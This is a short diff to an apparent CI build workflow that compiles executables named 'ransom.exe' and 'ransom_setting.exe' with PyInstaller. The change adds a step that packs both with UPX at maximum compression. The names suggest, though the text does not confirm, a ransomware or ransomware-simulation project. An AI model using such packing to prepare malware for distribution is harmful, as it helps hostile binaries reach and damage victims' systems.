@@ -36,6 +36,12 @@ jobs:
     - name: Build Settings App (ransom_setting.exe)
       run: python -m PyInstaller --clean ransom_setting.spec
 
+    - name: Compress with UPX Ultra-Brute
+      run: |
+        choco install upx
+        upx --ultra-brute dist/ransom.exe
+        upx --ultra-brute dist/ransom_setting.exe
+
     - name: Upload Artifacts
       uses: actions/upload-artifact@v4
       with:
